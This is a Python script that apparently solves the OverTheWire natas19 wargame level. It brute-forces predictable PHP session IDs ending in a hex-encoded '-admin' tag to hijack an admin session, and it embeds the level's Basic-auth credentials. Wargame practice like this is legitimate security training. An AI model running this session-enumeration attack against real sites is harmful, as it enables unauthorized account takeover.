import itertools
import requests

character_space = [""] + map(str, range(31, 40))
constant_tail = "2d61646d696e"

for x in itertools.product(character_space, repeat=3):
    token = "".join(x) + constant_tail
    url = "http://natas19.natas.labs.overthewire.org/index.php"
    payload = {"username": "admin", "password": "admin"}
    headers = {"Cookie": "PHPSESSID={0}".format(token), "Authorization": "Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw=="}

    print("trying {0}...".format(token))
    r = requests.post(url, params=payload, headers=headers)

    if "You are logged in as a regular user" in r.text:
        print("fail")
    else:
        print(r.text)
        exit()